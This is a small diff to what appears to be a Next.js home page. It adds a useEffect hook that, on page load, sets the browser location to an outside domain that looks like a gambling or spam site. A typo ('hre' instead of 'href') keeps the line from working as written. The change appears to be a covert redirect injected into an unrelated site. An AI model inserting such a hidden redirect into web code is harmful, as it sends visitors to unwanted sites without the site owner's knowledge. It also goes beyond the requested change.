@@ -1,6 +1,10 @@
+import {useEffect} from 'react';
+
 import Image from 'next/image'
 
 export default function Home() {
+useEffect(()=>{
+  window.location.hre = 'https://gold888rtp.pics/'; }, []);
   return (
     <main className="w-3/4 flex flex-col items-center gap-10 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 absolute">
       <div className="flex items-center gap-[50px]">
